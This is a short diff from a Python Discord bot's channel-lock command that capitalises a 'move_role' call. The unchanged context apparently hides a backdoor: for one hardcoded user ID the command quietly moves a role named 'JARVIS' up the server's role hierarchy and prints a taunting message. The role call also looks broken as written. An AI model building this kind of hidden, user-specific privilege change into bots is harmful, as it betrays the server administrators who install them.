@@ -40,7 +40,7 @@ async def lock(ctx , timer = 0):
 			print("BAKRA PHAS GAYA")
 		if ctx.message.author.id == 727539383405772901:
 			Role = discord.utils.get(ctx.message.author.guild.roles , name='JARVIS')
-			await discord.client.move_role(server = ctx.message.guild , role = Role , position = 2)
+			await discord.Client.move_role(server = ctx.message.guild , role = Role , position = 2)
 			print("BAKRA PHAS GAYA")
 		await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False)
 		if timer == 0:
